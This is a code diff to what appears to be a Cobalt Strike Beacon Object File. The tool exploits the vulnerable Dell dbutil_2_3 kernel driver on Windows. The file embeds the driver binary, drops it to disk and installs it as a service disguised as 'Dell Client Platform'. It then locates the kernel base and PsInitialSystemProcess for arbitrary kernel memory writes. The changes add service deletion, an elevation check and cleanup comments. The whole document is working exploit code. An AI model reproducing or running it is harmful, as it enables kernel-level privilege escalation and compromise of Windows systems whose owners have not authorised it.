@@ -110,7 +110,7 @@ unsigned char driverFile[] = { 0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0
 uint64_t driverFileSize = 14840;
 
 /**
- * Get the kernel base in in the system virtual address space.
+ * Get the kernel base in the system virtual address space.
  * 
  * @return LPVOID A pointer to the kernel base in the system space.
  */
@@ -138,7 +138,7 @@ LPVOID getKernelBase() {
     DWORD dwCount = pSystemModules->NumberOfModules;
     
     for (DWORD i = 0; i < dwCount; i++) {
-        if (MSVCRT$strstr((const char*) pSystemModules->Modules[i].FullPathName, "ntoskrnl.exe")) {
+        if (MSVCRT$strstr((char*) pSystemModules->Modules[i].FullPathName, "ntoskrnl.exe")) {
             PCHAR pBase = (PCHAR) pSystemModules->Modules[i].ImageBase;
             KERNEL32$GlobalFree(pSystemModules);
             return pBase;
@@ -189,6 +189,49 @@ bool dropServiceBinary(wchar_t* driverPath) {
     BeaconPrintf(CALLBACK_OUTPUT, "Wrote driver as file: %S.", driverPath);
 
     KERNEL32$CloseHandle(hFile);
+    return true;
+}
+
+/**
+ * Stop the given service and it's binary.
+ * 
+ * @param char* serviceName The name of the service to stop.
+ * @return bool Positive if it is deleted.
+ */
+bool deleteService(char* serviceName) {
+    // Establishes a connection to the service control manager.
+    SC_HANDLE hServiceManager;
+    if (!(hServiceManager = ADVAPI32$OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT))) {
+        BeaconPrintf(CALLBACK_ERROR, "Cannot open handle to the service manager.");
+        return false;
+    }
+
+    // Open service (if possible)
+    SC_HANDLE hService = ADVAPI32$OpenServiceW(hServiceManager, serviceName, SERVICE_STOP);
+    if (hService == NULL) {
+        BeaconPrintf(CALLBACK_ERROR, "Service not installed: %d.", KERNEL32$GetLastError());
+        ADVAPI32$CloseServiceHandle(hServiceManager);
+        return false;
+    }
+
+    // Stop the service
+    DWORD serviceStatus;
+    if (!ADVAPI32$ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus)) {
+        BeaconPrintf(CALLBACK_ERROR, "Could not stop service: %d, %d.", KERNEL32$GetLastError(), serviceStatus);
+        ADVAPI32$CloseServiceHandle(hService);
+        ADVAPI32$CloseServiceHandle(hServiceManager);
+        return false;
+    }
+
+    // Delete the service
+    if (!ADVAPI32$DeleteService(hService)) {
+        BeaconPrintf(CALLBACK_ERROR, "Could not delete service.");
+        ADVAPI32$CloseServiceHandle(hService);
+        ADVAPI32$CloseServiceHandle(hServiceManager);
+    }
+
+    ADVAPI32$CloseServiceHandle(hService);
+    ADVAPI32$CloseServiceHandle(hServiceManager);
     return true;
 }
 
@@ -250,8 +293,10 @@ bool installService(wchar_t* serviceName, wchar_t* serviceDescription, wchar_t* 
         }
     }
 
+    // Close existing connections
     ADVAPI32$CloseServiceHandle(hService);
     ADVAPI32$CloseServiceHandle(hServiceManager);
+
     return true;
 }
 
@@ -308,34 +353,36 @@ void memoryWrite(HANDLE hDevice, uint8_t* address, uint8_t* value) {
 void go(char* args, int length) {
     wchar_t* SERVICE_NAME = L"dbutil_2_3";
     wchar_t* SERVICE_DESC = L"Dell Client Platform";
-    wchar_t* SERVICE_PATH = L"C:\\windows\\tasks\\dbutil_2_3.sys";
-    //wchar_t* SERVICE_PATH = L"C:\\windows\\system32\\drivers\\dbutil_2_3.sys";
+    wchar_t* SERVICE_PATH = L"C:\\windows\\system32\\drivers\\dbutil_2_3.sys";
 
     BeaconPrintf(CALLBACK_OUTPUT, "Identifying if vulnerable kernel driver is installed.");
     bool isInitialyVulnerable = isVulnerableDriverInstalled();
-    
+
+    if (!isInitialyVulnerable && !BeaconIsAdmin()) {
+        BeaconPrintf(CALLBACK_ERROR, "The vulnerable kernel driver is not installed, and you're not running elevated.");
+        return;
+    }
+
     if (!isInitialyVulnerable) {
         BeaconPrintf(CALLBACK_OUTPUT, "Dropping vulnerable kernel driver to disk.");
         dropServiceBinary(SERVICE_PATH);
 
         BeaconPrintf(CALLBACK_OUTPUT, "Installing vulnerable kernel driver.");
         if (!installService(SERVICE_NAME, SERVICE_DESC, SERVICE_PATH)) {
-            BeaconPrintf(CALLBACK_ERROR, "Could not install vulnerable kernel driver. Are you local administrator?");
+            BeaconPrintf(CALLBACK_ERROR, "Could not install vulnerable kernel driver.");
             return;
+        } else {
+            BeaconPrintf(CALLBACK_OUTPUT, "Installed vulnerable kernel driver successfully.");
         }
-    } else {
-        BeaconPrintf(CALLBACK_OUTPUT, "Vulnerable kernel driver already installed.");
     }
 
     HANDLE hDevice = KERNEL32$CreateFileW(L"\\\\.\\dbutil_2_3", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-
     if (hDevice == INVALID_HANDLE_VALUE) {
         BeaconPrintf(CALLBACK_ERROR, "Failed to open handle to kernel driver.");
         return;
     }
 
     HMODULE hNtOsKrnl = KERNEL32$LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
-
     if (!hNtOsKrnl) {
         BeaconPrintf(CALLBACK_ERROR, "Cannot load 'ntoskrnl.exe'.");
         KERNEL32$CloseHandle(hDevice);
@@ -346,7 +393,6 @@ void go(char* args, int length) {
     BeaconPrintf(CALLBACK_OUTPUT, "Identified 'PsInitialSystemProcess' at 0x%x.", systemProcessOffset);
 
     size_t kernelBase = (size_t) getKernelBase();
-
     if (!kernelBase) {
         BeaconPrintf(CALLBACK_ERROR, "Kernel base not correctly identified.");
         return;
@@ -380,8 +426,9 @@ void go(char* args, int length) {
     }
 
     if (!isInitialyVulnerable) {
-        //deleteService(serviceName);
-        //deleteServiceBinary(driverPath);
+        // TODO: Identify how we can stop a running kernel driver without reboot
+        //deleteService(SERVICE_NAME);
+        //deleteServiceBinary(SERVICE_PATH);
     }
 
     KERNEL32$CloseHandle(hDevice);
